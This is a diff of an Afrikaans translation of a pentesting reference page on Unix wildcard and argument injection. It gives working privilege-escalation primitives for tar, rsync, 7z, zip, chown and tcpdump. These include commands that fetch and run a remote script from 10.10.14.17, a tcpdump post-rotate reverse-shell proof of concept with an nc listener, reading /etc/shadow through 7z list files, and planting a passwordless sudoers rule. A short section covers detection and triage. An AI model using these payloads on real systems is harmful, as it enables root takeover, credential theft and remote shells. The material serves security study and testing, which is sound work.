@@ -1,71 +1,71 @@
-# Wildcard Spare Tricks
+# Wildcards: Bykomende truuks
 
-{{#include ../../banners/hacktricks-training.md}}
-
-> Wildcard (ook bekend as *glob*) **argument injection** vind plaas wanneer ’n bevoorregte script ’n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … uitvoer met ’n wildcard wat nie tussen aanhalingstekens is nie, soos `*`.
-> Omdat die shell die wildcard **voor** die uitvoering van die binary uitbrei, kan ’n aanvaller wat lêers in die werkgids kan skep, lêername saamstel wat met `-` begin sodat dit as **options in plaas van data** geïnterpreteer word, en sodoende arbitrêre flags of selfs commands insmokkel.
+> Wildcard (ook bekend as *glob*) **argument injection** vind plaas wanneer ’n bevoorregte script ’n Unix-binary soos `tar`, `chown`, `rsync`, `zip`, `7z`, … uitvoer met ’n ongekwoteerde wildcard soos `*`.
+> Omdat die shell die wildcard **voor** die uitvoering van die binary uitbrei, kan ’n aanvaller wat lêers in die werkgids kan skep, lêername saamstel wat met `-` begin sodat hulle as **opsies in plaas van data** geïnterpreteer word, en sodoende effektief arbitrêre flags of selfs commands insmokkel.<sup>[[6]](#references)</sup>
 > Hierdie bladsy versamel die nuttigste primitives, onlangse navorsing en moderne detections vir 2023-2025.
 
 ## chown / chmod
 
-Jy kan die **eienaar/groep of die permission bits van ’n arbitrêre lêer kopieer** deur die `--reference` flag te misbruik:
+Jy kan die **eienaar/groep of permission bits van ’n verwysingslêer kopieer** deur die `--reference`-flag te misbruik wanneer ’n opsie-agtige lêernaam deur ’n wildcard uitgebrei word.<sup>[[6]](#references)[[8]](#references)[[9]](#references)</sup>
 ```bash
 # attacker-controlled directory
-touch "--reference=/root/secret``file"   # ← filename becomes an argument
+touch -- .drf.php
+chmod 777 -- .drf.php
+touch -- "--reference=.drf.php"   # ← filename becomes an argument
 ```
 Wanneer root later iets soos die volgende uitvoer:
 ```bash
 chown -R alice:alice *.php
 chmod -R 644 *.php
 ```
-`--reference=/root/secret``file` word geïnjecteer, wat veroorsaak dat *alle* ooreenstemmende lêers die eienaarskap/toestemmings van `/root/secret``file` oorneem.
+Die uitgebreide `--reference=.drf.php` ignoreer die eksplisiete eienaar/modus, wat veroorsaak dat ooreenstemmende lêers metadata van `.drf.php` erf (en, met die opstelling hierbo, deur die aanvaller skryfbaar gemaak word).<sup>[[6]](#references)</sup>
 
-*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
-Sien ook die klassieke DefenseCode-artikel vir besonderhede.<sup>[[6]](#references)</sup>
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (gekombineerde aanval).<sup>[[7]](#references)</sup>
+Sien ook die klassieke DefenseCode-paper vir besonderhede.<sup>[[6]](#references)</sup>
 
 ---
 
 ## tar
 
-### GNU tar (Linux, *BSD, busybox-full)
+### GNU tar
 
-Voer arbitrêre opdragte uit deur die **checkpoint**-funksie te misbruik:
+Voer arbitrêre commands uit deur GNU tar se **checkpoint**-funksie en checkpoint-actions te misbruik.<sup>[[10]](#references)</sup>
 ```bash
 # attacker-controlled directory
 echo 'echo pwned > /tmp/pwn' > shell.sh
 chmod +x shell.sh
-touch "--checkpoint=1"
-touch "--checkpoint-action=exec=sh shell.sh"
+touch -- "--checkpoint=1"
+touch -- "--checkpoint-action=exec=sh shell.sh"
 ```
-Sodra root byvoorbeeld `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.
+Sodra root byvoorbeeld `tar -czf /root/backup.tgz *` uitvoer, word `shell.sh` as root uitgevoer.<sup>[[10]](#references)</sup>
 
-### bsdtar / macOS 14+
+### bsdtar / macOS-kompressor-override-voorbehoud
 
-Die verstek-`tar` op onlangse macOS (gebaseer op `libarchive`) implementeer nie *`--checkpoint`* nie, maar jy kan steeds code-execution bewerkstellig met die **--use-compress-program**-flag, wat jou toelaat om ’n eksterne compressor te spesifiseer.
+Die verstek-`tar` op onlangse macOS (gebaseer op `libarchive`) verskaf nie GNU tar se `--checkpoint`-koppelvlak nie, maar bsdtar dokumenteer **--use-compress-program** vir die kies van ’n eksterne kompressor.<sup>[[11]](#references)</sup>
 ```bash
 # macOS example
-touch "--use-compress-program=/bin/sh"
+touch -- "--use-compress-program=sh"
 ```
-Wanneer ’n bevoorregte skrip `tar -cf backup.tar *` uitvoer, sal `/bin/sh` begin word.
+Wanneer ’n bevoorregte skrip `tar -cf backup.tar *` uitvoer, kies dit `sh` deur die slagoffer se `PATH`, en bsdtar begin dit as die compressor.<sup>[[11]](#references)</sup> Dit bewys option injection, maar is nie op sigself ’n betroubare arbitrary-command primitive nie: ’n wildcard-geskepte lêernaam kan nie `/` bevat nie, en bsdtar verskaf argiefdata eerder as ’n aanvaller-geselekteerde shell-opdrag. Kode-uitvoering vereis ook ’n beheerbare executable wat deur `PATH` of ’n ander argumentkanaal opgelos word wat ’n nuttige program kan benoem.
 
 ---
 
 ## rsync
 
-`rsync` laat jou toe om die remote shell of selfs die remote binary te override via command-line flags wat met `-e` of `--rsync-path` begin:
+`rsync` laat jou toe om die remote shell of die remote binary te ignoreer deur command-line flags soos `-e` en `--rsync-path` te gebruik.<sup>[[12]](#references)</sup>
 ```bash
 # attacker-controlled directory
-touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
+touch -- "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-As root die directory later met `rsync -az * backup:/srv/` archiveer, laat die injected flag jou shell aan die remote kant spawn.
+As root later die gids met `rsync -az * backup:/srv/` argiveer, kan die ingevoegde vlag ’n shell deur die remote-shell-meganisme uitvoer.<sup>[[7]](#references)[[12]](#references)</sup>
 
-*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).
+*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync`-modus).
 
 ---
 
 ## 7-Zip / 7z / 7za
 
-Selfs wanneer die privileged script die wildcard *defensief* met `--` prefix (om option parsing te stop), ondersteun die 7-Zip format **file list files** deur die filename met `@` te prefix. Deur dit met ’n symlink te kombineer, kan jy *arbitrary lêers exfiltrate*:
+Selfs wanneer die bevoorregte script die wildcard *defensief* met `--` voorafgaan (om option parsing te stop), aanvaar die 7-Zip CLI **file list files** deur die lêernaam met `@` vooraf te gaan. Deur dit met ’n symlink te kombineer, kan jy *enige lêers eksfiltreer*.<sup>[[13]](#references)</sup>
 ```bash
 # directory writable by low-priv user
 cd /path/controlled
@@ -76,17 +76,17 @@ As root iets soos die volgende uitvoer:
 ```bash
 7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as 'n lêerlys te lees en sal ophou, **terwyl dit die inhoud na stderr druk**.
+7-Zip sal probeer om `root.txt` (→ `/etc/shadow`) as ’n lêerlys te lees en sal staak, **terwyl dit die inhoud na stderr druk**.<sup>[[13]](#references)</sup>
 
-Dit oorleef `-- *`, omdat die 7-Zip CLI eksplisiet beide gewone lêername en `@listfiles` as positional inputs aanvaar, dus word 'n letterlike lêernaam soos `@root.txt` steeds spesiaal hanteer.
+Dit oorleef `-- *`, omdat die 7-Zip CLI uitdruklik beide gewone lêername en `@listfiles` as posisionele invoere aanvaar; dus word ’n letterlike lêernaam soos `@root.txt` steeds spesiaal hanteer.<sup>[[13]](#references)</sup>
 
 ---
 
 ## zip
 
-Twee baie praktiese primitives bestaan wanneer 'n toepassing user-controlled filenames aan `zip` deurgee (hetsy via 'n wildcard of deur name te enumerating sonder `--`).<sup>[[2]](#references)[[3]](#references)</sup>
+Twee baie praktiese primitives bestaan wanneer ’n toepassing user-controlled filenames aan `zip` deurgee (hetsy via ’n wildcard of deur name sonder `--` op te som).<sup>[[2]](#references)[[3]](#references)</sup>
 
-- RCE via test hook: `-T` aktiveer “test archive” en `-TT <cmd>` vervang die tester met 'n arbitrary program (long form: `--unzip-command <cmd>`). As jy filenames kan inject wat met `-` begin, split die flags oor afsonderlike filenames sodat short-options parsing werk:
+- RCE via test hook: `-T` aktiveer “test archive” en `-TT <cmd>` vervang die tester met ’n arbitrêre program (lang vorm: `--unzip-command <cmd>`). As jy filenames kan inject wat met `-` begin, verdeel die flags oor afsonderlike filenames sodat short-options parsing werk.<sup>[[2]](#references)[[3]](#references)</sup>
 ```bash
 # Attacker-controlled filenames (e.g., in an upload directory)
 # 1) A file literally named: -T
@@ -96,43 +96,42 @@ Twee baie praktiese primitives bestaan wanneer 'n toepassing user-controlled fil
 # zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
 ```
 Notas
-- Moenie ’n enkele lêernaam soos `'-T -TT <cmd>'` probeer nie — kort opsies word per karakter ontleed en dit sal misluk. Gebruik afsonderlike tokens soos aangedui.
-- As slashes deur die app van lêername verwyder word, haal dit vanaf ’n kaal host/IP (standaardpad `/index.html`) en stoor dit plaaslik met `-O`, en voer dit dan uit.
-- Jy kan parsing met `-sc` (toon verwerkte argv) of `-h2` (meer hulp) ontfout om te verstaan hoe jou tokens verwerk word.
+- Moenie ’n enkele lêernaam soos `'-T -TT <cmd>'` probeer nie — kort opsies word per karakter ontleed en dit sal misluk. Gebruik afsonderlike tokens soos aangedui.<sup>[[3]](#references)</sup>
+- As skuinsstrepe deur die toepassing uit lêername verwyder word, haal vanaf ’n kale host/IP (standaardpad `/index.html`) af en stoor dit plaaslik met `-O`, en voer dit dan uit.<sup>[[3]](#references)</sup>
+- Jy kan ontleding met `-sc` (wys verwerkte argv) of `-h2` (meer hulp) ontfout om te verstaan hoe jou tokens verbruik word.<sup>[[3]](#references)</sup>
 
-Voorbeeld (plaaslike gedrag op zip 3.0):
+Voorbeeld (plaaslike gedrag op zip 3.0).<sup>[[3]](#references)</sup>
 ```bash
 zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
 zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
 ```
-- Data exfil/leak: Indien die weblaag `zip` se stdout/stderr eggo (algemeen met naïewe wrappers), sal geïnjekteerde flags soos `--help` of foute van verkeerde opsies in die HTTP-response verskyn, wat command-line injection bevestig en help met die verfyning van payloads.
+- Data exfil/leak: As die weblaag `zip` se stdout/stderr eggo (algemeen met naïewe wrappers), sal ingespuitte flags soos `--help` of foute van verkeerde opsies in die HTTP-respons verskyn, wat command-line injection bevestig en help om payload-aanpassing te verfyn.<sup>[[3]](#references)</sup>
 
 ---
 
-## Addisionele binaries wat kwesbaar is vir wildcard injection (2023-2025-kortlys)
+## Bykomende option-injection-kandidate
 
-Die volgende commands is in moderne CTFs en werklike omgewings misbruik. Die payload word altyd as ’n *lêernaam* binne ’n skryfbare gids geskep wat later met ’n wildcard verwerk sal word:
+Wanneer ’n bevoorregte wrapper ’n skryfbare directory met ’n wildcard uitbrei, is hierdie gedokumenteerde opsie-hooks die moeite werd om na te gaan.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>
 
-| Binary | Flag om te misbruik | Effek |
+| Binary | Flag to abuse | Effek |
 | --- | --- | --- |
-| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrêre `@file` | Lees lêerinhoud |
-| `flock` | `-c <cmd>` | Voer command uit |
-| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git oor SSH |
-| `scp`   | `-S <cmd>` | Begin ’n arbitrêre program in plaas van ssh |
+| `flock` | `-c <cmd>` | Gee ’n command-string aan ’n shell deur |
+| `git`   | `-c core.sshCommand=<cmd>` | Gebruik `<cmd>` in plaas van SSH vir Git fetch/push |
+| `scp`   | `-S <program>` | Gebruik ’n alternatiewe SSH-versoenbare connection program |
 
-Hierdie primitives is minder algemeen as die *tar/rsync/zip*-klassiekers, maar dit is die moeite werd om daarvoor te kyk tydens hunting.
+Hierdie primitives is nuttige kontroles buiten die klassieke *tar/rsync/zip*.
 
 ---
 
-## Hunting na kwesbare wrappers en jobs
+## Opsporing van kwesbare wrappers en jobs
 
-Onlangse gevallestudies het getoon dat wildcard/argv injection nie meer net ’n **cron + tar**-probleem is nie.<sup>[[5]](#references)</sup> Dieselfde bug-klas verskyn steeds in:
+Onlangse case studies en detection guidance wys dat wildcard/argv injection nie meer net ’n **cron + tar**-probleem is nie.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup> Dieselfde bug-klas verskyn steeds in:
 
-- webfeatures wat "alles as zip/tar aflaai" uit aanvaller-beheerde upload-gidse
-- vendor/appliance debug shells wat ’n **tcpdump**-wrapper met aanvaller-beheerde lêernaam/filter-velde blootstel
-- backup- of rotation-jobs wat `tar`, `rsync`, `7z`, `zip`, `chown` of `chmod` op skryfbare gidse uitvoer
+- webfunksies wat “alles as zip/tar aflaai” uit directories met aanvaller-beheerde uploads
+- vendor/appliance debug shells wat ’n **tcpdump**-wrapper met aanvaller-beheerde filename/filter-velde blootstel
+- backup- of rotation-jobs wat `tar`, `rsync`, `7z`, `zip`, `chown`, of `chmod` op skryfbare directories uitvoer
 
-Nuttige triage commands:
+Nuttige triage commands (die `pspy`-invocation gebruik sy gedokumenteerde process/file-event- en interval-flags).<sup>[[14]](#references)</sup>
 ```bash
 # Hunt for interesting binaries fed with globs or positional user data
 rg -n --hidden --follow \
@@ -148,22 +147,22 @@ rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
 ```
 Vinnige heuristieke:
 
-- `-- *` is 'n goeie oplossing vir baie GNU tools, maar **nie** vir `7z`/`7za` nie, omdat `@listfiles` afsonderlik geparse word.
-- Vir `zip`, soek wrappers wat user-controlled filenames direk opnoem; short-option splitting (`-T` + `-TT <cmd>`) werk steeds selfs sonder 'n shell glob.
-- Vir `tcpdump`, let veral op wrappers waarmee jy **output file names**, **rotation settings** of **capture-file replay**-argumente kan beheer.
+- `-- *` is ’n goeie oplossing vir baie GNU-tools, maar **nie** vir `7z`/`7za` nie, omdat `@listfiles` afsonderlik geparse word.<sup>[[13]](#references)</sup>
+- Vir `zip`, soek wrappers wat user-controlled filenames direk opsom; short-option splitting (`-T` + `-TT <cmd>`) werk steeds, selfs sonder ’n shell glob.<sup>[[2]](#references)[[3]](#references)</sup>
+- Vir `tcpdump`, let veral op wrappers waarmee jy **output file names**, **rotation settings** of **capture-file replay**-argumente kan beheer.<sup>[[18]](#references)</sup>
 
 ---
 
 ## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers
 
-Wanneer 'n restricted shell of vendor wrapper 'n `tcpdump` command line saamstel deur user-controlled fields (bv. 'n "file name"-parameter) aanmekaar te voeg sonder streng quoting/validasie, kan jy ekstra `tcpdump`-flags insmokkel. Die kombinasie van `-G` (time-based rotation), `-W` (limit number of files) en `-z <cmd>` (post-rotate command) lewer arbitrary command execution as the user running tcpdump (dikwels root op appliances).<sup>[[1]](#references)[[4]](#references)</sup>
+Wanneer ’n restricted shell of vendor wrapper ’n `tcpdump`-command line saamstel deur user-controlled velde aaneen te skakel (byvoorbeeld ’n “file name”-parameter) sonder streng quoting/validation, kan jy ekstra `tcpdump`-flags insmokkel. Die kombinasie van `-G` (time-based rotation), `-W` (limit number of files) en `-z <cmd>` (post-rotate command) lewer arbitrary command execution as die user wat tcpdump uitvoer (dikwels root op appliances).<sup>[[1]](#references)[[4]](#references)[[18]](#references)</sup>
 
 Voorwaardes:
 
-- Jy kan die `argv` wat aan `tcpdump` deurgegee word, beïnvloed (bv. via 'n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).
-- Die wrapper saniteer nie spasies of tokens wat met `-` begin in die file name-veld nie.
+- Jy kan die `argv` wat aan `tcpdump` deurgegee word, beïnvloed (byvoorbeeld via ’n wrapper soos `/debug/tcpdump --filter=... --file-name=<HERE>`).<sup>[[4]](#references)[[18]](#references)</sup>
+- Die wrapper sanitize nie spasies of tokens wat met `-` begin in die file name-veld nie.<sup>[[4]](#references)</sup>
 
-Klassieke PoC (voer 'n reverse shell script vanaf 'n writable path uit):
+Klassieke PoC (voer ’n reverse shell script uit vanaf ’n writable path).<sup>[[4]](#references)[[18]](#references)</sup>
 ```sh
 # Reverse shell payload saved on the device (e.g., USB, tmpfs)
 cat > /mnt/disk1_1/rce.sh <<'EOF'
@@ -181,51 +180,51 @@ nc -6 -lvnp 4444 &
 # Then send any packet that matches the BPF to force a rotation
 printf x | nc -u -6 [victim_ipv6] 1234
 ```
-Besonderhede:
+Details:
 
-- `-G 1 -W 1` dwing ’n onmiddellike rotate af ná die eerste matching packet.
-- `-z <cmd>` voer die post-rotate command een keer per rotation uit. Baie builds voer `<cmd> <savefile>` uit. Indien `<cmd>` ’n script/interpreter is, maak seker dat die argument handling by jou payload pas.
+- `-G 1` roteer elke sekonde, en `-W 1` stop ná een geroteerde lêer; die capture moet ’n ooreenstemmende packet ontvang voordat rotasie plaasvind.<sup>[[18]](#references)</sup>
+- `-z <cmd>` voer die post-rotate command een keer per rotasie uit en gee die pad na die geslote savefile as ’n argument deur; maak seker dat script/interpreter-argumenthantering by jou payload pas.<sup>[[18]](#references)</sup>
 
-Variante sonder verwyderbare media:
+Variante sonder removable media:
 
-- Indien jy enige ander primitive het om files te skryf (byvoorbeeld ’n aparte command wrapper wat output redirection toelaat), plaas jou script in ’n bekende path en trigger `-z /bin/sh /path/script.sh` of `-z /path/script.sh`, afhangend van platform semantics.
-- Sommige vendor wrappers rotate na attacker-controllable locations. Indien jy die rotated path kan beïnvloed (symlink/directory traversal), kan jy `-z` stuur om content uit te voer wat jy volledig beheer sonder eksterne media.
+- As jy enige ander primitive het om lêers te skryf (bv. ’n aparte command wrapper wat output redirection toelaat), plaas jou script in ’n bekende pad en trigger `-z /path/script.sh`; laat die script self `/bin/sh` aanroep indien nodig.<sup>[[18]](#references)</sup>
+- As ’n vendor wrapper jou toelaat om die geroteerde pad te kies, oudit daardie padbeheer slegs in kombinasie met ’n post-rotate command wat sy savefile-argument interpreteer; padbeheer alleen voer nie lêerinhoud uit nie.<sup>[[18]](#references)</sup>
 
 ---
 
-## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root
+## sudoers: tcpdump with wildcards/additional args → arbitrêre write/read en root
 
-Baie algemene sudoers anti-pattern:<sup>[[3]](#references)</sup>
+Example sudoers anti-pattern:<sup>[[3]](#references)</sup>
 ```text
 (ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
 ```
-Kwessies
-- Die `*` glob en permissiewe patrone beperk slegs die eerste `-w`-argument. `tcpdump` aanvaar veelvuldige `-w`-opsies; die laaste een geld.
-- Die reël beperk nie ander opsies nie, dus word `-Z`, `-r`, `-V`, ens. toegelaat.
+Die reël laat verskeie opsies beskikbaar binne tcpdump se gedokumenteerde parser:<sup>[[3]](#references)[[18]](#references)</sup>
+- Die `*` glob en permissiewe patrone beperk slegs die eerste `-w`-argument. `tcpdump` aanvaar veelvuldige `-w`-opsies; die laaste een geld.<sup>[[3]](#references)[[18]](#references)</sup>
+- Die reël beperk nie ander opsies nie, dus word `-Z`, `-r`, `-V`, ens. toegelaat.<sup>[[3]](#references)[[18]](#references)</sup>
 
-Primitiewe
-- Oorskryf die bestemmingspad met ’n tweede `-w` (slegs die eerste een voldoen aan sudoers):
+Die relevante primitives word hieronder gedokumenteer.<sup>[[3]](#references)[[18]](#references)</sup>
+- Oorskryf die bestemmingspad met ’n tweede `-w` (die eerste een voldoen slegs aan sudoers).<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ \
 -w /dev/shm/out.pcap \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Path traversal binne die eerste `-w` om uit die beperkte boomstruktuur te ontsnap:
+- Path traversal binne die eerste `-w` om die beperkte boomstruktuur te ontsnap.<sup>[[3]](#references)</sup>
 ```bash
 sudo tcpdump -c10 \
 -w/var/cache/captures/a/../../../../dev/shm/out \
 -F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Dwing uitvoereienaarskap af met `-Z root` (skep root-owned files enige plek):
+- Dwing uitvoer-eienaarskap af met `-Z root` (skep root-owned lêers enige plek).<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -w /dev/shm/root-owned \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-- Skryf van arbitrêre inhoud deur ’n crafted PCAP via `-r` te replay (bv. om ’n sudoers-reël te drop):
+- Skryf van arbitrêre inhoud deur 'n vervaardigde PCAP via `-r` te herhaal (byvoorbeeld om 'n sudoers-reël neer te lê).<sup>[[3]](#references)[[18]](#references)</sup>
 
 <details>
-<summary>Skep ’n PCAP wat die presiese ASCII payload bevat en skryf dit as root</summary>
+<summary>Skep 'n PCAP wat die presiese ASCII-payload bevat en skryf dit as root</summary>
 ```bash
 # On attacker box: craft a UDP packet stream that carries the target line
 printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
@@ -237,9 +236,7 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
 -r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
 -F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
 ```
-</details>
-
-- Arbitrêre lêerlees/geheime leak met `-V <file>` (interpreteer ’n lys van savefiles). Foutdiagnostiek eggo dikwels reëls, wat inhoud lek:
+- Willekeurige lêerlees/geheime leak met `-V <file>` (interpreteer ’n lys van savefiles). Foutdiagnostiek eggo dikwels lyne, wat inhoud laat leak.<sup>[[3]](#references)[[18]](#references)</sup>
 ```bash
 sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 -w /tmp/dummy \
@@ -247,13 +244,24 @@ sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
 ```
 ---
 
-## Verwysings
+## References
 
 - [1] [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
 - [2] [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
 - [3] [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
-- [4] [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
-- [5] [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
-- [6] [Back To The Future: Unix Wildcards Gone Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
-
+- [4] [FiberGateway GR241AG - Volledige Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
+- [5] [Elastic - Potensiële Shell via Wildcard Injection bespeur](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)
+- [6] [Terug na die Toekoms: Unix Wildcards raak Wild (DefenseCode)](https://www.exploit-db.com/papers/33930)
+- [7] [wildpwn](https://github.com/localh0t/wildpwn)
+- [8] [GNU Coreutils `chown`-aanroeping](https://www.gnu.org/software/coreutils/manual/html_node/chown-invocation.html)
+- [9] [GNU Coreutils `chmod`-aanroeping](https://www.gnu.org/software/coreutils/manual/html_node/chmod-invocation.html)
+- [10] [GNU tar-checkpoints](https://www.gnu.org/software/tar/manual/html_section/checkpoints.html)
+- [11] [bsdtar(1)-handleiding](https://man.freebsd.org/cgi/man.cgi?query=bsdtar&sektion=1)
+- [12] [rsync(1)-handleiding](https://download.samba.org/pub/rsync/rsync.1)
+- [13] [7-Zip-opdragreëlsintaks](https://7-zip.opensource.jp/chm/cmdline/syntax.htm)
+- [14] [pspy](https://github.com/DominicBreuker/pspy)
+- [15] [flock(1)-handleiding](https://kernel.googlesource.com/pub/scm/utils/util-linux/util-linux/+/refs/tags/v2.41.1/sys-utils/flock.1.adoc)
+- [16] [Git-konfigurasiedokumentasie](https://git-scm.com/docs/git-config)
+- [17] [OpenBSD `scp`-handleiding](https://man.openbsd.org/scp)
+- [18] [tcpdump(8)-handleiding](https://man7.org/linux/man-pages/man8/tcpdump.8.html)
 {{#include ../../banners/hacktricks-training.md}}
